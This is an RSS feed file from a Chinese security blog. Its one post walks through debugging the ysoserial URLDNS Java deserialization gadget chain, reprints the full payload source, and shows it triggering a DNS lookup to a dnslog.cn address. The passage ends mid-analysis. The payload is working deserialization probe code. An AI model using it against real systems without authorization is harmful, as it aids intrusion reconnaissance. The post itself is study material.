@@ -1,0 +1,197 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Milkii0的秘密花园 • Posts by &#34;ysoserial调试&#34; tag</title>
+        <link>http://example.com</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Wed, 25 Aug 2021 11:38:45 +0800</pubDate>
+        <lastBuildDate>Wed, 25 Aug 2021 11:38:45 +0800</lastBuildDate>
+        <category>ysoserial调试</category>
+        <category>Java反序列化</category>
+        <category>文件上传靶场</category>
+        <category>web,HTTP</category>
+        <category>redis,未授权,漏洞利用</category>
+        <category>前后端分离</category>
+        <category>木马,汇总</category>
+        <category>pikachu,web靶场</category>
+        <category>webgoat</category>
+        <category>dorabox,靶场练习</category>
+        <category>sql注入靶场</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</guid>
+            <title>ysoserial之URLDNS调试</title>
+            <link>http://example.com/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</link>
+            <category>ysoserial调试</category>
+            <pubDate>Wed, 25 Aug 2021 11:38:45 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;触发结果为一次 DNS 请求，适用目标无回显情况&lt;/li&gt;
+&lt;li&gt;使用 java 内置类构造，无第三方库依赖&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;urldns利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#urldns利用代码&#34;&gt;#&lt;/a&gt; URLDNS 利用代码&lt;/h1&gt;
+&lt;p&gt;poc：&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; ysoserial.payloads;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.InetAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLConnection;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLStreamHandler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Authors;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Dependencies;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.PayloadTest;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.PayloadRunner;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.Reflections;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * A blog post with more details about this gadget chain is at the url below:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   This was inspired by  Philippe Arteau &lt;span class=&#34;doctag&#34;&gt;@h&lt;/span&gt;3xstream, who wrote a blog&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   posting describing how he modified the Java Commons Collections gadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   in ysoserial to open a URL. This takes the same idea, but eliminates&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   the dependency on Commons Collections and does a DNS lookup with just&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   standard JDK classes.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   The Java URL class has an interesting property on its equals and&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   hashCode methods. The URL class will, as a side effect, do a DNS lookup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   during a comparison (either equals or hashCode).&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   As part of deserialization, HashMap calls hashCode on each key that it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   deserializes, so using a Java URL object as a serialized key allows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   it to trigger a DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   Gadget Chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *     HashMap.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *       HashMap.putVal()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *         HashMap.hash()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *           URL.hashCode()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@SuppressWarnings(&amp;#123; &amp;quot;rawtypes&amp;quot;, &amp;quot;unchecked&amp;quot; &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PayloadTest(skip = &amp;quot;true&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Dependencies()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Authors(&amp;#123; Authors.GEBL &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLDNS&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ObjectPayload&lt;/span&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;Object&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String url)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Avoid DNS resolution during payload creation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URLStreamHandler handler = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; SilentURLStreamHandler();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                HashMap ht = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap(); &lt;span class=&#34;comment&#34;&gt;// HashMap that will contain the URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URL u = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; URL(&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, url, handler); &lt;span class=&#34;comment&#34;&gt;// URL to use as the Key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ht.put(u, url); &lt;span class=&#34;comment&#34;&gt;//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                Reflections.setFieldValue(u, &lt;span class=&#34;string&#34;&gt;&amp;quot;hashCode&amp;quot;&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// During the put above, the URL&amp;#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ht;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                PayloadRunner.run(URLDNS.class, args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * using the serialized object.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * second resolution.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SilentURLStreamHandler&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; URLConnection &lt;span class=&#34;title&#34;&gt;openConnection&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;synchronized&lt;/span&gt; InetAddress &lt;span class=&#34;title&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;链接：&lt;a href=&#34;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&#34;&gt;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;调试分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试分析&#34;&gt;#&lt;/a&gt; 调试分析&lt;/h1&gt;
+&lt;p&gt;项目链接：&lt;a href=&#34;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&#34;&gt;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;打开 idea，找到 URLDNS 入口：ysosertial-&amp;gt;src-&amp;gt;main-&amp;gt;java-&amp;gt;ysoserial-&amp;gt;payloads-&amp;gt;URLDNS.java-&amp;gt;main ()&lt;/p&gt;
+&lt;h2 id=&#34;运行尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行尝试&#34;&gt;#&lt;/a&gt; 运行尝试&lt;/h2&gt;
+&lt;p&gt;直接运行 main 函数，发现默认传入的命令为 calc.exe&lt;/p&gt;
+&lt;p&gt;报错：URL 初始化失败，找不到 calc.exe 协议&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后一行报错信息指向 main 函数，倒数第二行报错信息指向 PayloadRunner&lt;/p&gt;
+&lt;p&gt;说明为传入参数 args 有误，应为 URL，也是我们要发送请求的地址&lt;/p&gt;
+&lt;p&gt;打开 dnslog，获取到地址为：&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;编辑传入参数，&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;http://ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再次运行 main ()，payload 为我们传入的参数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;刷新 dnslog 的请求记录，发现接收到了请求，利用成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;代码调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码调试&#34;&gt;#&lt;/a&gt; 代码调试&lt;/h2&gt;
+&lt;p&gt;我们从 main 函数一步一步调试，会发现 URLDNS 在 main 中调用 PayloadRunner#run ()&lt;/p&gt;
+&lt;p&gt;然后 PayloadRunner#run () 中调用 URLDNS#getObject ()&lt;/p&gt;
+&lt;p&gt;URLDNS#getObject () 中的 HashMap &lt;strong&gt;ht&lt;/strong&gt; 就是我们要生成的（未序列化）payload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;getObeject 方法中，创建了一个 URL 对象（存储我们输入的 dns 地址）–&amp;gt; 再将 URL 对象放入 HashMap 中&lt;/p&gt;
+&lt;p&gt;下面一行的注释写道，在上面的 put 过程中，计算并缓存了 URL 的 hashCode; 这将重置它，以便下次调用 hashCode 时将触发 DNS 查找&lt;/p&gt;
+&lt;p&gt;那么在 ht.put 时，我们进入 HashMap 查看，发现 key 进行了 hash 计算&lt;/p&gt;
+&lt;p&gt;（这里插播一条小道消息，点击这个调试可以返回上一步&lt;img src=&#34;14.png&#34; style=&#34;zoom:90%;&#34; /&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在这里就是我们的 URL 对象进行了 hash 计算&lt;/p&gt;
+&lt;p&gt;hash 计算前的 URL 对象：&lt;/p&gt;
